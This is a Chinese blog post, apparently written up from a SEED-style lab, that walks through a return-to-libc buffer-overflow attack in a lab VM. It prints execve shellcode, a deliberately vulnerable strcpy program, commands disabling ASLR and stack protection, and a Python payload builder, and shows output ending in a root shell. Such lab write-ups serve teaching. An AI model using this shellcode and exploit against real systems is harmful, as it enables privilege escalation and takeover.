<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>return-to-libc攻击 - 编程鬼谷子的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="return-to-libc攻击" />
<meta property="og:description" content="栈的主要目的用来存储数据，很少需要在栈中运行代码，因此，大多数程序不需要可执行的程序栈，在一些体系架构中（包括x86),可以在硬件程序面上将一段内存区域标记为不可执行。在Ubuntu系统中，如果使用gcc编译程序，可以让gcc生成一个特殊的二进制文件，这个二进制文件头部有一个比特位，表示是否将栈设置为不可执行，当程序被加载执行时，操作系统首先为程序分配内存，然后检查该比特位，如果它被置位，那么栈的内存区域将被标记为不可执行。#include &lt;string.h&gt; const char code[] = &#34;\x31\xc0&#34; /* xorl %eax,%eax */ &#34;\x50&#34; /* pushl %eax */ &#34;\x68&#34;&#34;//sh&#34; /* pushl $0x68732f2f */ &#34;\x68&#34;&#34;/bin&#34; /* pushl $0x6e69622f */ &#34;\x89\xe3&#34; /* movl %esp,%ebx */ &#34;\x50&#34; /* pushl %eax */ &#34;\x53&#34; /* pushl %ebx */ &#34;\x89\xe1&#34; /* movl %esp,%ecx */ &#34;\x99&#34; /* cdq */ &#34;\xb0\x0b&#34; /* movb $0x0b,%al */ &#34;\xcd\x80&#34; /* int $0x80 */ ; int main(int argc, char **argv) { char buf[sizeof(code)]; strcpy(buf, code); ((void(*)( ))buf)( ); } 上述代码首先将一段shellcode放入栈中的缓冲区，然后将缓冲区转换为函数，，接着调用这个函数。运行[07/07/20]seed@VM:~/code$ gcc -z execstack shellcode." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcguiguzi.github.io/posts/5cebaa998e23a362ebb488b588fd5c5f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-07-07T14:15:24+08:00" />
<meta property="article:modified_time" content="2020-07-07T14:15:24+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程鬼谷子的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程鬼谷子的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">return-to-libc攻击</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <ol><li>栈的主要目的用来存储数据，很少需要在栈中运行代码，因此，大多数程序不需要可执行的程序栈，在一些体系架构中（包括x86),可以在硬件程序面上将一段内存区域标记为不可执行。</li><li>在Ubuntu系统中，如果使用gcc编译程序，可以让gcc生成一个特殊的二进制文件，这个二进制文件头部有一个比特位，表示是否将栈设置为不可执行，当程序被加载执行时，操作系统首先为程序分配内存，然后检查该比特位，如果它被置位，那么栈的内存区域将被标记为不可执行。<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
<span class="token keyword">const</span> <span class="token keyword">char</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span>
  <span class="token string">"\x31\xc0"</span>             <span class="token comment">/* xorl    %eax,%eax              */</span>
  <span class="token string">"\x50"</span>                 <span class="token comment">/* pushl   %eax                   */</span>
  <span class="token string">"\x68"</span><span class="token string">"//sh"</span>           <span class="token comment">/* pushl   $0x68732f2f            */</span>
  <span class="token string">"\x68"</span><span class="token string">"/bin"</span>           <span class="token comment">/* pushl   $0x6e69622f            */</span>
  <span class="token string">"\x89\xe3"</span>             <span class="token comment">/* movl    %esp,%ebx              */</span>
  <span class="token string">"\x50"</span>                 <span class="token comment">/* pushl   %eax                   */</span>
  <span class="token string">"\x53"</span>                 <span class="token comment">/* pushl   %ebx                   */</span>
  <span class="token string">"\x89\xe1"</span>             <span class="token comment">/* movl    %esp,%ecx              */</span>
  <span class="token string">"\x99"</span>                 <span class="token comment">/* cdq                            */</span>
  <span class="token string">"\xb0\x0b"</span>             <span class="token comment">/* movb    $0x0b,%al              */</span>
  <span class="token string">"\xcd\x80"</span>             <span class="token comment">/* int     $0x80                  */</span>
<span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
   <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>      
 <span class="token punctuation">}</span>
</code></pre> </li></ol> 
<ul><li>上述代码首先将一段shellcode放入栈中的缓冲区，然后将缓冲区转换为函数，，接着调用这个函数。</li><li>运行<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ gcc -z execstack shellcode.c 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ a.out
$ <span class="token keyword">exit</span>
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ gcc -z noexecstack shellcode.c 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ a.out
Segmentation fault
</code></pre> </li><li>第一次编译时将栈设置为可执行的，可以看到成功获得了一个shell；第二个编译时，将栈设置为不可执行的，恶意代码将无法执行，系统会输出Segmentation fault。</li><li>如果想改变一个已经编译好程序的可执行栈的比特位，可以使用一个叫做execstack的工具<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> execstack
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ execstack -s a.out  <span class="token comment">#让栈可执行</span>
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ a.out 
$ <span class="token keyword">exit</span>
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ execstack -c a.out  <span class="token comment">#让栈不可执行</span>
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/code$ a.out 
Segmentation fault
</code></pre> </li><li>内存中有一个区域存放着很多代码，主要是标准C语言库函数，在Linux中，该库被称为libc，它是一个动态链接库，很多用户的程序都需要使用libc库中的函数，所以在这些程序运行之前，操作系统会将libc库加载到内存中。</li><li>现在的问题就变成是否存在一个libc函数可供使用，以达到恶意目的，如果存在，则可以让由漏洞的程序跳转到该libc函数，其中最容易被利用的就是system()函数，这个函数接受一个字符串作为参数，将此字符串作为一个命令来执行，有了这个函数，如果想要在缓冲区溢出后运行一个shellcode，只需要跳转到system()函数，让它来运行指定的"/bin/sh"程序即可，这就是return-to-libc攻击。</li></ul> 
<h4><a id="_48"></a>攻击实验：准备</h4> 
<ol><li>使用存在缓冲区溢出漏洞程序stack.c.<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">ifndef</span> BUF_SIZE</span>
<span class="token macro property">#<span class="token directive keyword">define</span> BUF_SIZE 100</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

<span class="token keyword">int</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">/* The following statement has a buffer overflow problem */</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>



    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">foo</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Returned Properly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> </li><li>编译以及保护机制</li></ol> 
<ul><li>编译时，在打开不可执行栈的同时，需要关闭StackGuard保护机制，另外还需要关闭地址和空间布局随机化机制。</li></ul> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ gcc -fno-stack-protector -z noexecstack -o stack stack.c 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span>0
kernel.randomize_va_space <span class="token operator">=</span> 0
</code></pre> 
<ul><li>将程序变成一个root用户的Set-UID程序</li></ul> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">sudo</span> <span class="token function">chown</span> root stack
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">sudo</span> <span class="token function">chmod</span> 4755 stack
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">ls</span> -l stack
-rwsr-xr-x 1 root seed 7476 Jul  7 05:36 stack
</code></pre> 
<h4><a id="returntolibc_93"></a>发起return-to-libc攻击：第一部分</h4> 
<ol><li>这里的目标是跳转到system()函数，然后让它执行/bin/sh,这相当于调用system("/bin/sh"),为了实现这个目标，需要执行以下三个任务：</li></ol> 
<ul><li>找到system()函数地址：需要找到system()函数在内存中的地址将有漏洞程序的函数返回地址改成该地址，这样函数返回时就会跳转到system()函数。</li><li>找到字符串/bin/sh的地址。</li><li>system()函数的参数：获取/bin/sh的地址之后，需要将地址传给system()函数，system()函数从栈中获取参数，这意味着字符串的地址需要放在栈中，难点在于弄清楚参数的地址具体放在栈中哪个位置。</li></ul> 
<ol start="2"><li>找到system()函数的地址</li></ol> 
<ul><li>在Linux中，当一个需要使用libc的程序运行时，libc函数库将被加载到内存中，当ASLR关闭时，对同一个程序，这个函数库总是加载到相同的内存地址。</li><li>可以使用调试工具轻易找到system()函数在内存中的地址。</li></ul> 
<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ gdb -q stack <span class="token comment">#q参数是调试器不打印不必要的信息</span>
Reading symbols from stack<span class="token punctuation">..</span>.<span class="token punctuation">(</span>no debugging symbols found<span class="token punctuation">)</span><span class="token punctuation">..</span>.done.
gdb-peda$ run
Starting program: /home/seed/Documents/return-to-libc/stack 
<span class="token punctuation">..</span><span class="token punctuation">..</span>
gdb-peda$ p system
<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">&gt;</span><span class="token punctuation">}</span> 0xb7e42da0 <span class="token operator">&lt;</span>__libc_system<span class="token operator">&gt;</span>
gdb-peda$ p <span class="token keyword">exit</span>
<span class="token variable">$2</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">&gt;</span><span class="token punctuation">}</span> 0xb7e369d0 <span class="token operator">&lt;</span>__GI_exit<span class="token operator">&gt;</span>
gdb-peda$
</code></pre> 
<ul><li>对于同一个程序，如果把它从Set-UID程序改成非Set-UID程序时，libc函数加载的地址可能时不一样的，上述调试一个要使用由漏洞的Set-UID程序，否则得到的地址可能是不对的。</li></ul> 
<ol start="3"><li>找到字符串/bin/sh的地址</li></ol> 
<ul><li>为了让system()函数运行/bin/sh命令，字符串/bin/sh需要预先存在内存中，它的地址需要作为参数传递给system()函数。</li><li>可以把字符串放置在缓冲区中，然后获取它的地址，或者利用环境变量，运行漏洞程序之前，定义一个环境变量MYSHELL="/bin/sh"，并用export命令指明该环境变量会被传递给子进程。</li><li>下面程序用于打印出MYSHELL环境变量的地址：<pre><code class="prism language-shell"><span class="token comment">#include &lt;stdio.h&gt;</span>
<span class="token comment">#include &lt;stdlib.h&gt;</span>

int main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
        char* shell <span class="token operator">=</span> <span class="token punctuation">(</span>char*<span class="token punctuation">)</span>getenv<span class="token punctuation">(</span><span class="token string">"MYSHELL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        if<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
                printf<span class="token punctuation">(</span><span class="token string">"value-&gt;%s\n"</span>,shell<span class="token punctuation">)</span><span class="token punctuation">;</span>
                printf<span class="token punctuation">(</span><span class="token string">"address-&gt;%x\n"</span>,<span class="token punctuation">(</span>unsigned int<span class="token punctuation">)</span>shell<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> 1<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> </li><li>运行程序<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ gcc -o env55 envaddr.c 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">export</span> MYSHELL<span class="token operator">=</span><span class="token string">"/bin/sh"</span>
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ ./env55 
value-<span class="token operator">&gt;</span>/bin/sh
address-<span class="token operator">&gt;</span>bffffeec
</code></pre> </li><li>一旦ASLR被关闭，MYSHELL环境变量在由一个进程生成的不同子进程中的地址将是一样的，但需要注意的时，MYSHELL环境变量的地址和程序名称的长度有关。<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">mv</span> env55 env7777
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ ./env7777 
value-<span class="token operator">&gt;</span>/bin/sh
address-<span class="token operator">&gt;</span>bffffee8
</code></pre> </li><li>环境变量保存在程序的栈中，但在环境变量被压入栈之前，首先被压入栈中的程序名称，因此，程序名称的长度将影响环境变量在内存中的位置。<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ gcc -g -o envaddr_dbg envaddr.c 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ gdb -q envaddr_dbg
Reading symbols from envaddr_dbg<span class="token punctuation">..</span>.done.
gdb-peda$ b main
Breakpoint 1 at 0x804844c: <span class="token function">file</span> envaddr.c, line 6.
gdb-peda$ run
Starting program: /home/seed/Documents/return-to-libc/envaddr_dbg 
<span class="token punctuation">..</span>.
0xbffffe3a:	<span class="token string">"PWD=/home/seed/Documents/return-to-libc"</span>
0xbffffe62:	<span class="token string">"JAVA_HOME=/usr/lib/jvm/java-8-oracle"</span>
0xbffffe87:	<span class="token string">"LANG=en_US.UTF-8"</span>
0xbffffe98:	<span class="token string">"LINES=21"</span>
0xbffffea1:	<span class="token string">"SHLVL=2"</span>
0xbffffea9:	<span class="token string">"HOME=/home/seed"</span>
0xbffffeb9:	<span class="token string">"LOGNAME=seed"</span>
0xbffffec6:	<span class="token string">"MYSHELL=/bin/sh"</span>
<span class="token punctuation">..</span>.
</code></pre> </li><li>可以看到函数名称存储在0xbffffe3a这个位置，改变程序名称继续实验，会发现所有环境变量的位置都会发送便宜。</li></ul> 
<h4><a id="returntolibc_169"></a>发起return-to-libc攻击：第二部分</h4> 
<ol><li>在return-to-libc攻击中，system()函数不是以常规方式被调用的：目标程序知识跳转到函数代码的入口，并没有为这次调用做好准备，因此函数所需要的参数并不在栈中，必须弥补这个缺失的步骤，也就是说，在漏洞程序跳转到system()之前，需要自行将参数放入栈中。</li><li>函数的第一个参数放到了%ebp+8,无论函数合适需要访问它的第一个参数，它都会使用%ebp+8作为这个参数的地址，因此，在return-to-libc攻击中，预测漏洞跳转到system()函数后ebp指向的位置是非常关键的，需要把/bin/sh字符串放置在比ebp的预测地址高8字节的位置。</li><li>一个函数的开头和结尾分别称为函数的序言和后记：</li></ol> 
<ul><li>序言就是函数开头处的代码，它用于为函数准备栈和指针<pre><code class="prism language-shell">pushl %ebp <span class="token comment">#保存ebp值</span>
movl %esp, %ebp <span class="token comment">#让ebp指向被调用者的栈帧</span>
subl <span class="token variable">$N</span>, %esp <span class="token comment">#为局部变量预留空间</span>
</code></pre> </li><li>函数的后记是函数末尾处，用于恢复栈和寄存器到函数调用以前的状态：、<pre><code class="prism language-shell">movl %ebp,%esp <span class="token comment">#释放为局部变量开辟的空间</span>
popl %ebp <span class="token comment">#让ebp指向调用者函数的栈帧</span>
ret <span class="token comment">#函数返回，弹出返回地址并且移动esp指针</span>
</code></pre> </li><li>IA-32体系结构的处理器由两条内设指令：enter和leave。enter指令指向函数的序言，leave指令指向后记的前两条指令。<br> <img src="https://images2.imgbox.com/4c/48/E0uUHvqT_o.png" alt="在这里插入图片描述"></li></ul> 
<ol start="4"><li>在发生缓冲区溢出攻击后，图中的返回地址变成了system()函数的返回地址，在foo()函数返回时，会执行foo()的后记代码，首先释放局部变量的缓冲区，此时esp和ebp指向同一个位置，然后将ebp恢复到指向main函数的栈帧，具体是多少我们无需关心，esp上移，然后弹出返回地址，esp上移，调用sytem()函数。在system()函数调用后，会执行system()函数的前言代码，首先保存ebp的值，此时esp向下移动一个单位，然后将ebp指向esp当前指向的位置，接着为局部变量开辟空间。</li><li>注意在第三个图中的2位置应该保存的是system函数的返回地址，如果随便存在一个值，当system函数返回时（/bin/sh程序结束后才会返回），程序很可能崩溃，更好的办法是将exit()函数的地址存放在哪里，这样当system函数返回时，它将跳转到exit()函数，从而完美终止程序。</li><li>现在我们需要计算上图中的1、2、3标记的3个位置距离缓冲区的偏移量：<pre><code class="prism language-shell">07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ gcc -fno-stack-protector -z noexecstack -g -o stack_dbg stack.c 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">touch</span> badfile
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ gdb -q stack_dbg
Reading symbols from stack_dbg<span class="token punctuation">..</span>.done.
gdb-peda$ b foo
Breakpoint 1 at 0x80484c1: <span class="token function">file</span> stack.c, line 13.
gdb-peda$ run
Starting program: /home/seed/Documents/return-to-libc/stack_dbg 
<span class="token punctuation">..</span>.
gdb-peda$ p <span class="token variable">$ebp</span>
<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">(</span>void *<span class="token punctuation">)</span> 0xbffff1b8
gdb-peda$ p <span class="token operator">&amp;</span>buffer
<span class="token variable">$2</span> <span class="token operator">=</span> <span class="token punctuation">(</span>char <span class="token punctuation">(</span>*<span class="token punctuation">)</span><span class="token punctuation">[</span>100<span class="token punctuation">]</span><span class="token punctuation">)</span> 0xbffff14c
gdb-peda$ p/d 0xbffff1b8-0xbffff14c
<span class="token variable">$3</span> <span class="token operator">=</span> 108
gdb-peda$ 
</code></pre> </li></ol> 
<ul><li>从上面实验可以看出foo函数中ebp距离buffer的距离为108个字节，因此可以得出： 
  <ol><li>3位置的偏移是108+4 =112字节，此位置保存在system()函数的地址。</li><li>2位置的偏移是108+8 = 116字节，此位置保存exit()函数的地址。</li><li>1位置的偏移是108+12 = 120字节，此位置保存的是字符串/bin/sh的地址。</li></ol> </li><li>编写下面Python程序来构建输入，结果保存到badfile文件中，代码如下：<pre><code class="prism language-python">!<span class="token operator">/</span>usr<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>python3
<span class="token keyword">import</span> sys

<span class="token comment">#给content填上非0值</span>
content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0xaa</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

a3 <span class="token operator">=</span> <span class="token number">0xbffffeec</span> <span class="token comment">#/bin/sh环境变量的地址，之前已经计算过，env55和stack程序名子一样长，所以环境变量地址相同</span>
content<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">:</span><span class="token number">124</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a3<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>

a2 <span class="token operator">=</span> <span class="token number">0xb7e369d0</span> <span class="token comment">#exit函数的地址</span>
content<span class="token punctuation">[</span><span class="token number">116</span><span class="token punctuation">:</span><span class="token number">120</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>

a1 <span class="token operator">=</span> <span class="token number">0xb7e42da0</span> <span class="token comment">#system函数的地址</span>
content<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">:</span><span class="token number">116</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>

<span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> </li><li>运行上述程序，生成badfile，然后攻击漏洞程序stack，结果显示得到了一个 root权限的shell。<pre><code class="prism language-shell"><span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">chmod</span> u+x libc_exploit.py 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ ./libc_exploit.py 
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">sudo</span> <span class="token function">ln</span> -sf /bin/zsh /bin/sh
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ <span class="token function">export</span> MYSHELL<span class="token operator">=</span><span class="token string">"/bin/sh"</span>
<span class="token punctuation">[</span>07/07/20<span class="token punctuation">]</span>seed@VM:~/<span class="token punctuation">..</span>./return-to-libc$ ./stack
<span class="token comment"># id</span>
uid<span class="token operator">=</span>1000<span class="token punctuation">(</span>seed<span class="token punctuation">)</span> gid<span class="token operator">=</span>1000<span class="token punctuation">(</span>seed<span class="token punctuation">)</span> euid<span class="token operator">=</span>0<span class="token punctuation">(</span>root<span class="token punctuation">)</span> groups<span class="token operator">=</span>1000<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,113<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,128<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>
</code></pre> </li></ul> 
<h4><a id="_243"></a>返回导向编程</h4> 
<ol><li>Shacham在一篇论文中演示了return-to-libc攻击不需要一定要返回到一个已有的函数，从而把return-to-libc推广到返回导向编程（ROP）</li><li>ROP的思想是巧妙地把内存中的一些小的指令序列串起来，这些指令其实并不放在一起，但它们最后一个指令都是return，通过正确设置栈上的返回地址域，可以使得一个序列执行完毕后执行return指令返回时，会返回到下一个指令序列。通过这种方法，可以把不在一起的指令串起来，Shacham在文章中指出，libc函数库中可以找到所需要的指令序列来完成几乎任何操作。</li></ol> 
<h4><a id="_246"></a>总结</h4> 
<ul><li>在return-to-libc攻击中，通过改变返回地址，攻击者能够是目标程序跳转到已经被加载到内存中的某个libc库中的函数，system()函数是一个好的选择，如果攻击者能够跳转到这个函数，使它执行system("/bin/sh")，这将会产生一个root shell。这个攻击最主要的难点时找到system()函数存放参数的位置，使得当进入system()函数之后，system()函数能够正确获取指令字符串参数。</li></ul>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/1b9ccf6e4007c87ffa85b08a32e016c8/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">jupyter notebook 打开没有报错但是浏览器空白页问题解决方法</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/6a03198a9e78ccb2c400d6bf6307df09/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">CVPR 2020 论文大盘点-图像与视频检索篇</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>